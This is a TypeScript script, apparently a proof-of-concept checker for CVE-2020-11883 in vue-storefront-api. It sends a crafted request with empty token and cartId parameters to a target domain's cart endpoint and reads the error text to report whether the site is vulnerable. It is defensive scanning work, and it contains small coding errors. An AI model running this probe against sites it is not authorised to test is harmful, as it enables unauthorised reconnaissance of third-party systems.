import axios, { AxiosResponse } from "axios";
import chalk from "chalk";

/**
 *
 * @author Ondřej Klapka <ja@oklapka.tech>
 * @date 1.3 2021
 *
 */

const domain = process.argv[2];

const processRequest = async (url: string) => {
  try {
    const res = await axios.request({
      method: "GET",
      url: "https://" + domain + "/" + url,
      headers: {
        Host: domain,
        Accept: "/",
        "Content-Type": "application/json",
        Origin: "https://" + domain,
        "Content-Length": "2",
      },
      data: "\x0d\x0a",
    });
    return res.data();
  } catch (error) {
    const response = error.response as AxiosResponse<any>;
    return response.data.result;
  }
};

const sendRequest = () => processRequest("api/cart/pull?token=&cartId=");

const validateSum = (response: string) => {
  if (response == "Cannot read property '1' of null") {
    return 0;
  } else if (response.includes("TypeError" || "firstchar")) {
    return 1;
  } else {
    return 0;
  }
};

const test = async () => {
  console.log(
    chalk.yellow.underline("Running the vulnerability: CVE-2020-11883")
  );
  const res = await sendRequest();
  console.log(chalk.blue(domain));

  console.log(chalk.yellow.underline("Checking the vulnerability"));
  console.log(chalk.white(validateSum(res)));

  console.log("");

  console.log(
    validateSum(res) > 0
      ? chalk.red( chalk.bgCyan(res) + "\nThe website is vulnerable! Update vue-storefront-api!")
      : chalk.green("The website is secured against this attack!")
  );
};

test();

export default test;
